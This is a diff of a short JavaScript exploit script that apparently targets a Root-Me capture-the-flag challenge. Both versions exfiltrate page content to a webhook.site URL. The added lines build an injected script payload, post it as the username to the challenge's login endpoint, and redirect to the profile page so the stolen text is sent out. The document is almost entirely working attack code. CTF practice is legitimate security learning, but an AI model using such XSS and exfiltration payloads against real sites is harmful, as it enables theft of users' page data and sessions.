@@ -1,7 +1,8 @@
 // https://tim-xd.github.io/web-client/index.html
 
+const LOGIN = "http://challenge01.root-me.org:58003/login";
 const PROFILE = "http://challenge01.root-me.org:58003/profile";
-const WEBHOOK = "https://webhook.site/abaf4f7a-3e2f-4fb6-aebd-9076e261d651?";
+const WEBHOOK = "https://webhook.site/abaf4f7a-3e2f-4fb6-aebd-9076e261d651";
 
 function get(url) {
   let xhr = new XMLHttpRequest();
@@ -16,9 +17,9 @@ function post(url, data) {
 }
 
 try {
-  const o = window.open(PROFILE);
-  if (o === null) post(WEBHOOK, "null");
-  else post(WEBHOOK, o.document.body.innerText);
+  const payload = `<script>window.location=${WEBHOOK}?${document.body.innerText}</script>`;
+  post(LOGIN, `username=${payload}&secret=overriden_secret`);
+  window.location = PROFILE;
 } catch (error) {
   post(WEBHOOK, `Error: ${error}`);
 }
